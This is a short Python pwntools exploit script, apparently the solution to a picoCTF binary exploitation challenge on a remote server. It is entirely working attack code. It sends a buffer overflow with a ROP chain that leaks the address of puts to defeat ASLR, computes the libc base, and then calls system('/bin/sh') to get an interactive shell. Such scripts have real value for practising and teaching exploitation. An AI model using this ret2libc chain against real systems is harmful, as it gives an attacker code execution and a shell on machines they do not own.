from pwn import *

io = remote('mercury.picoctf.net', 49464)
elf = ELF('vuln')
libc = ELF('libc.so.6')
context.binary = elf

rdi_addr = 0x400913
puts_addr = 0x400540
ret_addr = 0x40052e

rop = ROP(elf)
rop.raw(ret_addr)
rop.puts(elf.got['puts'])
rop.raw(ret_addr)
rop.main()

payload = b'a' * (0x80 + 8) + rop.chain()
print(rop.dump())
io.sendlineafter(b'sErVeR!\n', payload)

io.recvline()
puts_leak = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts']

rop = ROP(libc)
rop.raw(ret_addr)
rop.system(next(libc.search(b'/bin/sh\x00')))
payload = b'a' * (0x80 + 8) + rop.chain()

print(rop.dump())
io.sendlineafter(b'sErVeR!', payload)

io.interactive()
